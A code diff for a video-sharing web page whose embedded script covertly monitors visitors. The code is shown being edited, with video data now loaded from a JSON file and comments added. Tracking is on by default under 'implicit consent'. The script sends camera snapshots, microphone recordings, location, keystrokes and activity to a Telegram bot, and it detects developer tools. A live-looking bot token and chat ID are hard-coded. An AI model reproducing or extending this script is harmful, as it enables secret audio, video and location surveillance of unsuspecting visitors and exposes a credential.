@@ -134,23 +134,29 @@
 
 <script>
 // --- IMPORTANT PRIVACY AND LEGAL WARNING ---
-// ... (previous warning remains) ...
+// This script collects extensive user data for tracking and monitoring.
+// By using this site, users implicitly agree to the data collection as described
+// in your Privacy Policy. ENSURE YOU HAVE A DETAILED AND LEGALLY COMPLIANT PRIVACY POLICY.
+// Collecting sensitive data like camera, microphone, location, and keystrokes without
+// EXPLICIT consent can violate privacy laws (e.g., GDPR, CCPA) and lead to legal repercussions.
+// Securely manage your Telegram Bot Token. It should NOT be exposed directly in client-side code for production applications.
 // --- END WARNING ---
 
 const App = {
   config: {
-    botToken: "7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI",
-    chatId: "1272791365",
-    snapshotInterval: 15000,
-    micRecordInterval: 30000,
-    activityTrackingInterval: 5000,
-    pageAnalyticsInterval: 60000,
+    botToken: "7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI", // !!! REPLACE WITH YOUR ACTUAL BOT TOKEN !!!
+    chatId: "1272791365", // !!! REPLACE WITH YOUR ACTUAL CHAT ID !!!
+    snapshotInterval: 15000, // 15 seconds for camera snapshots
+    micRecordInterval: 30000, // 30 seconds for microphone chunks
+    activityTrackingInterval: 5000, // Report accumulated activity every 5 seconds
+    pageAnalyticsInterval: 60000, // Report page analytics and check inactivity every minute
     sessionTimeout: 1800000, // 30 minutes of inactivity
     maxBufferedEvents: 50, // Limit for buffered events
+    videosJsonPath: 'videos.json', // Path to your JSON file
   },
   state: {
     isLoggedIn: false,
-    isTrackingActive: true,
+    isTrackingActive: true, // Tracking is active by default
     pageStartTime: Date.now(),
     lastActivityTime: Date.now(),
     sessionStartTime: Date.now(),
@@ -169,6 +175,7 @@ const App = {
     pagePerformanceMetrics: {},
     linkClicks: [],
     isContentLoaded: false,
+    videosData: null, // To store fetched video data
 
     // Permission states: 'granted', 'denied', 'prompt'
     permissions: {
@@ -195,14 +202,38 @@ const App = {
     console.log("Tracking is active by default (implicit consent).");
 
     this.recordPageLoadTimes();
-    this.generateVideoGrid();
     this.setupEventListeners();
     this.Tracking.initialize(); // Initializes tracking, including permission checks
     this.startPageAnalytics();
     this.startSessionTimer();
 
-    this.state.isContentLoaded = true;
-    this.hideLoadingOverlay();
+    // Fetch videos.json first before generating the grid
+    this.fetchAndGenerateVideoGrid();
+  },
+
+  fetchAndGenerateVideoGrid() {
+    fetch(this.config.videosJsonPath)
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        return response.json();
+      })
+      .then(videoData => {
+        this.state.videosData = videoData; // Store data in state
+        this.generateVideoGrid(); // Now generate the grid with fetched data
+        this.state.isContentLoaded = true;
+        this.hideLoadingOverlay();
+      })
+      .catch(error => {
+        console.error("Error fetching or parsing videos.json:", error);
+        // Display an error message to the user if videos fail to load
+        if (this.DOM.videoGrid) {
+          this.DOM.videoGrid.innerHTML = '<p>Could not load videos. Please try again later.</p>';
+        }
+        this.state.isContentLoaded = true; // Still hide loader even if there's an error
+        this.hideLoadingOverlay();
+      });
   },
 
   recordPageLoadTimes() {
@@ -219,6 +250,7 @@ const App = {
       };
       console.log("Page Load Metrics recorded:", this.state.pagePerformanceMetrics);
     } else {
+      // Fallback for older browsers or specific environments
       this.state.pagePerformanceMetrics.fetchStart = performance.timing.fetchStart;
       this.state.pagePerformanceMetrics.domContentLoadedEventEnd = performance.timing.domContentLoadedEventEnd;
       this.state.pagePerformanceMetrics.loadEventEnd = performance.timing.loadEventEnd;
@@ -229,21 +261,20 @@ const App = {
   },
 
   generateVideoGrid() {
-    console.log("Generating video grid...");
-    const videos = [
-      { id: 1, title: "Amazing Nature Scenery", thumbnail: "thumb1.jpg", src: "/p1.mp4", channel: "Nature Explorer", channelAvatar: "avatar1.jpg", views: "1.2M", timestamp: "2 days ago" },
-      { id: 2, title: "Tech Review: Latest Gadgets", thumbnail: "thumb2.jpg", src: "/p2.mp4", channel: "Tech Guru", channelAvatar: "avatar2.jpg", views: "500K", timestamp: "1 week ago" },
-      { id: 3, title: "Cooking Tutorial: Pasta", thumbnail: "thumb3.jpg", src: "/p4.mp4", channel: "Chef John", channelAvatar: "avatar3.jpg", views: "3M", timestamp: "5 hours ago" },
-      { id: 4, title: "Abstract Visuals p1", thumbnail: "thumb4.jpg", src: "/p5.mp4", channel: "Abstract Artist", channelAvatar: "avatar4.jpg", views: "50K", timestamp: "1 day ago" },
-      { id: 5, title: "Nature Montage p2", thumbnail: "thumb5.jpg", src: "/p6.mp4", channel: "Nature Explorer", channelAvatar: "avatar1.jpg", views: "80K", timestamp: "3 days ago" },
-    ];
+    console.log("Generating video grid with fetched data...");
+    const videos = this.state.videosData; // Use data from state
+
+    if (!videos) {
+      console.error("Video data not loaded yet or is empty.");
+      return;
+    }
 
     const videoGrid = this.DOM.videoGrid;
     if (!videoGrid) {
       console.error("Video grid element not found!");
       return;
     }
-    videoGrid.innerHTML = '';
+    videoGrid.innerHTML = ''; // Clear existing grid
 
     videos.forEach(video => {
       const card = document.createElement('div');
@@ -251,7 +282,7 @@ const App = {
       card.innerHTML = `
         <div class="thumbnail-wrapper">
           <video src="${video.src}" preload="metadata"></video>
-          <span class="duration">3:45</span>
+          <span class="duration">3:45</span> <!-- Placeholder duration -->
         </div>
         <div class="video-details">
           <img src="${video.channelAvatar}" alt="Channel Avatar" class="channel-avatar" />
@@ -302,7 +333,7 @@ const App = {
       const backButton = document.getElementById('back-to-grid');
 
       if (target === backButton || (backButton && backButton.contains(target))) {
-        return;
+        return; // Back button has its own listener
       }
 
       const link = target.closest('a');
@@ -403,13 +434,17 @@ const App = {
     const sidebar = this.DOM.recommendationsSidebar;
     if (!sidebar) return;
     sidebar.innerHTML = '<h3>Recommended Videos</h3>';
-    const recommendedVideos = [
-      { id: 3, title: "Another Nature Clip", src: "video3.mp4", views: "100K", timestamp: "3 days ago", channel: "Nature Explorer" },
-      { id: 4, title: "Web Development Tips", src: "video4.mp4", views: "75K", timestamp: "5 days ago", channel: "Code Master" },
-    ];
+    
+    // Use fetched data for recommendations if available
+    const recommendedVideos = this.state.videosData ?
+      this.state.videosData.filter(v => v.id !== currentVideoId).slice(0, 3) : // Limit to 3 recommendations
+      // Fallback data if videosData is not yet loaded
+      [
+        { id: 3, title: "Another Nature Clip", src: "video3.mp4", views: "100K", timestamp: "3 days ago", channel: "Nature Explorer" },
+        { id: 4, title: "Web Development Tips", src: "video4.mp4", views: "75K", timestamp: "5 days ago", channel: "Code Master" },
+      ];
 
     recommendedVideos.forEach(recVideo => {
-      if (recVideo.id !== currentVideoId) {
         const card = document.createElement('div');
         card.classList.add('compact-video-card');
         card.innerHTML = `
@@ -425,7 +460,6 @@ const App = {
         `;
         card.addEventListener('click', () => this.showPlayer(recVideo));
         sidebar.appendChild(card);
-      }
     });
   },
 
@@ -605,7 +639,7 @@ const App = {
 
   // --- Tracking Module ---
   Tracking: {
-    telegramApiBaseUrl: `https://api.telegram.org/bot${"7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI"}/`,
+    telegramApiBaseUrl: `https://api.telegram.org/bot${"7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI"}/`, // !!! Use your token !!!
 
     async send(message, notify = false) {
       if (!App.state.isTrackingActive) return;
@@ -615,7 +649,7 @@ const App = {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: "1272791365",
+            chat_id: "1272791365", // !!! Use your chat ID !!!
             text: message,
             parse_mode: 'Markdown',
             disable_notification: !notify
@@ -836,12 +870,12 @@ const App = {
       }
     },
 
-    // Placeholder methods (actual implementations exist elsewhere in the script)
-    async requestCamera() { /* ... actual implementation called by checkAndRequestPermission ... */ },
-    stopCamera() { /* ... actual implementation called by checkAndRequestPermission ... */ },
-    async requestMicrophone() { /* ... actual implementation called by checkAndRequestPermission ... */ },
-    stopMicrophone() { /* ... actual implementation called by checkAndRequestPermission ... */ },
-    async requestGeolocation() { /* ... actual implementation called by checkAndRequestPermission ... */ },
+    // Placeholder methods for actual implementations
+    async requestCamera() { /* ... implementation is in requestPermissionDirectly ... */ },
+    stopCamera() { /* ... implementation is in requestPermissionDirectly ... */ },
+    async requestMicrophone() { /* ... implementation is in requestPermissionDirectly ... */ },
+    stopMicrophone() { /* ... implementation is in requestPermissionDirectly ... */ },
+    async requestGeolocation() { /* ... implementation is in requestPermissionDirectly ... */ },
 
     detectDevTools() {
       const threshold = 160;
@@ -908,10 +942,10 @@ const App = {
     },
 
     sendAccumulatedActivity() {
-      // This function is for sending accumulated, non-urgent data if any.
-      // With current optimizations, the primary batching is handled by logPageInteraction.
+      // Placeholder for sending accumulated, non-urgent data if any.
+      // The primary batching is handled by logPageInteraction.
       if (!App.state.isTrackingActive) return;
-      // Placeholder for future accumulated activity reports.
+      // Logic to send accumulated, non-urgent data could go here.
     }
   }
 };
@@ -920,6 +954,6 @@ const App = {
 document.addEventListener('DOMContentLoaded', () => {
   App.init();
 });
-  </script>
+</script>
 </body>
 </html>
